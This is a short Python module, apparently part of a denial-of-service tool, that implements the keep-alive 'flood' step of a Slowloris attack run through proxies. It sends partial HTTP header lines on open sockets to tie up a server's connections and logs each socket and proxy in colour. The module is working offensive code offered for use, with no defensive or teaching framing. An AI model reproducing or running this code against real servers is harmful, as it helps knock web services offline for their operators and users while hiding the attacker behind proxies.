"""This module provides the flood function for a Slowloris DoS attack through proxies."""

import random
import socket
from typing import Dict

from colorama import Fore


def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
    """Keep alive the sockets in Slowloris flood through proxies.

    Args:
        - sock - The socket to be kept alive
        - proxy - The proxy to be used

    Returns:
        None
    """
    laddr, port = sock.getsockname()
    random_header = random.randint(1, 5000)
    sock.send(f"X-a: {random_header}".encode("utf-8"))
    proxy_addr = f"{Fore.RESET}|{Fore.RESET} Proxy: {Fore.BLUE}{proxy['addr'] + ':' + proxy['port']:>21} "
    header_sent = f"{Fore.RESET} Header Sent:{Fore.BLUE} X-a {random_header:>4}"
    print(
        f"{Fore.RESET} --> Socket: {Fore.BLUE}{laddr}:{port} {proxy_addr}{Fore.RESET}|{header_sent} {Fore.RESET}"
    )
